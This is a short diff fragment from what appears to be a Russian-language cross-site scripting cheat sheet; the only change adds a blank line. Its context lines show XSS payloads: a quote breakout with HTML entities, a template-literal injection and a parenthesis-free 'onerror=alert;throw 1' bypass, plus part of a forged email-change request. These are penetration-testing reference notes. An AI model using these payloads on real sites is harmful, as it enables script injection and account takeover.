@@ -72,3 +72,4 @@ changeReq.send('csrf='+token+'&email=test@test.com')
 	`&apos;-alert(document.domain)-&apos;`
 	2.3. Использовать конструкцию \${}: `${alert(document.domain)}`
 1. Если запрещены круглые скобки, можно передавать аргументы в функции через конструкцию: `onerror=alert;throw 1`
+
